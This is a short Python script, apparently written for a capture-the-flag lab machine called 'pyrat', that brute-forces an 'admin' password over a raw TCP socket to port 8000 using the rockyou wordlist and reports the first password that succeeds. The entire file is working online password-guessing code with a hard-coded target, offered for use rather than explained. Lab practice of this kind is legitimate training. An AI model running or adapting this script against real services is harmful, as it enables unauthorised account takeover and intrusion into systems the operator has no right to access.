import socket

# Configuration
import socket
import time

pyrat_IP = "10.10.247.143"
pyrat_PORT = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"

def send_socket(ip: str, port: int, password: str) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # timeout ekledik
        s.connect((ip, port))
        s.sendall(b'admin\n')

        resp = s.recv(1024).decode(errors="ignore")

        if "Password:" in resp:
            s.sendall(password.encode() + b"\n")
            resp = s.recv(1024).decode(errors="ignore")

            if "success" in resp.lower() or "admin" in resp.lower():
                print(f"[+] Found! admin:{password} -> {resp.strip()}")
                return True
            else:
                print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Connection error for password '{password}': {e}")
    finally:
        s.close()
    return False

def brut_pass():
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
        for line in file:
            password = line.strip()
            if send_socket(pyrat_IP, pyrat_PORT, password):
                break
            time.sleep(0.1)
if __name__ == "__main__":
    brut_pass()